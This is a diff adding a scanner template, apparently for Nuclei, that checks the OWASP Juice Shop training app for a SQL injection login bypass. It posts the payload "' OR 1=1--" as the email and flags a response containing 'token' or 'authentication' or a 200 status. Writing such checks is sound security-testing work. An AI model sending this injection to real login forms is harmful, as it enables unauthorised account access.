@@ -1,0 +1,29 @@
+id: juice-shop-sqli-login-bypass
+
+info:
+  name: Juice Shop SQLi Login Bypass
+  author: Youssef Ashraf
+  severity: high
+  tags: juice-shop,sqli,auth-bypass
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/#/login"
+    headers:
+      Content-Type: application/json
+    body: |
+      {
+        "email": "' OR 1=1--",
+        "password": "irrelevant"
+      }
+    matchers-condition: or
+    matchers:
+      - type: word
+        words:
+          - "authentication"
+          - "token"
+        part: body
+      - type: status
+        status:
+          - 200
